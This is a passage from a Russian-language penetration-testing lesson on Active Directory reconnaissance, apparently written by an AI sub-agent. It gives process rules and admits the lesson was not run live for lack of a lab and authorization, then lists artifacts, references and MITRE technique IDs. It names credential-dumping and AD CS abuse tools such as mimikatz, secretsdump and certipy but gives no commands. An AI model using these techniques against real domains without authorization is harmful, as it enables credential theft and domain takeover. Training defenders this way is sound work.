4. **certipy-ad = must-have для AD CS abuse** (ESC1-ESC8). Если в домене есть CA с уязвимым template — это мгновенный DA.

### 10.3 Про процесс

1. **Каждый шаг документируется** (команда + вывод + интерпретация).
2. **Прежде чем эксплуатировать — проверь scope.** Не лезь в чужой домен, даже если он «светится».
3. **Persistence только с разрешения владельца** (и в отчёте описать, как откатить).
4. **Без бэкапа цели — никаких secretsdump / mimikatz.** Если что-то пойдёт не так, нужен rollback.

---

## 11. Что я НЕ нашёл (честно)

Этот lesson — **playbook**, а не реальный разбор живого стенда. Я честно не выполнил атаку вживую, потому что:

1. **В sandbox-окружении нет QEMU/VirtualBox/UTM/Lima/Docker.** Только macOS host + brew.
2. **Подсеть 192.168.0.x, в которой я сижу — это домашний Wi-Fi Жени (TP-LINK WAP), не AD-stend.** Университетский AD или рабочий AD Жени мне недоступен.
3. **HTB VIP-машина требует spawn от Жени** (или VPN + креды). Это не в scope автономной работы sub-agent'а.
4. **GOAD требует Vagrant + VirtualBox** — для поднятия в песочнице нужно sudo + установка VirtualBox (что я не делал без явной команды).

**Что нужно от Жени, чтобы превратить playbook в реальный walkthrough:**

1. Подтвердить стенд: **GOAD-lite / HTB Forest-Cascade-Resolute-Mantis / CRTP lab** (что доступно).
2. Доступ к BloodHound GUI (Docker-контейнер локально, или дан удалённый BH-сервер).
3. Разрешение атаковать конкретный стенд (фиксируется в `agents/pentester/RULES.md`).

После этого 1 сессия (2-4 часа) = реальный walkthrough с screenshots, конкретными nxc/impacket-выводами, найденными путями к DA, и финальным отчётом в `agents/pentester/reports/<date>-<target>.md`.

---

## 12. Артефакты

- **Этот lesson:** `intel/lessons/lesson-002-ad-recon-nxc.md`
- **Методичка MITRE-mapping:** `intel/techniques/ad-recon.md`
- **Отчёт sub-agent'а:** `agents/pentester/reports/2026-06-30-report.md`

## 13. Связанные lessons

- **`intel/lessons/lesson-005-cve-2026-20230-cucm-ssrf.md`** (Скрипт 🐍, 30.06) — **другой chain CVE**: Cisco Unified CM SSRF → file write → root. Lesson-002 покрывает AD-recon; lesson-005 покрывает exploit-dev на enterprise-софте с похожим "mock-stand + ожидаемый сценарий" подходом (нет реального стенда в песочнице).
- **`intel/lessons/lesson-011-kev-triage-workflow.md`** (Хранитель 📚, 08.07) — общий workflow для обработки KEV-CVE (когда появляется AD-related CVE в KEV — как scoring'ить).
- **vEnv с тулами:** `~/.openclaw/workspace/tools/pentest/venv-ad/`
- **Задача:** `agents/pentester/reports/2026-06-29-task.md`
- **Профиль агента:** `agents/pentester/PROFILE.md`, `RULES.md`, `SKILLS.md`

## 13. Источники

- **nxc wiki:** <https://www.netexec.wiki/>
- **BloodHound CE Python ingestor:** <https://github.com/dirkjanm/BloodHound.py>
- **Impacket:** <https://github.com/fortra/impacket>
- **certipy-ad:** <https://github.com/ly4k/Certipy>
- **lsassy:** <https://github.com/Hackndo/lsassy>
- **bloodyAD:** <https://github.com/CravateRouge/bloodyAD>
- **GOAD:** <https://github.com/Orange-Cyberdefense/GOAD>
- **MITRE ATT&CK:**
  - T1087.002 — Account Discovery: Domain Account
  - T1482 — Domain Trust Discovery
  - T1069.002 — Permission Groups Discovery: Domain Groups
  - T1018 — Remote System Discovery
  - T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
  - T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting
  - T1558.005 — Steal or Forge Kerberos Tickets: Unconstrained Delegation
  - T1003.006 — OS Credential Dumping: DCSync
  - T1078.002 — Valid Accounts: Domain Accounts
  - T1136.002 — Create Account: Domain Account
- **HackTricks — AD Methodology:** <https://book.hacktricks.xyz/windows-hardening/active-directory-methodology>
- **ired.team — AD Notes:** <https://www.ired.team/>

---

*Создано 30.06.2026 Тень 🦅 в рамках задачи 30.06–06.07 (`agents/shared/TRAINING_PLAN.md`).*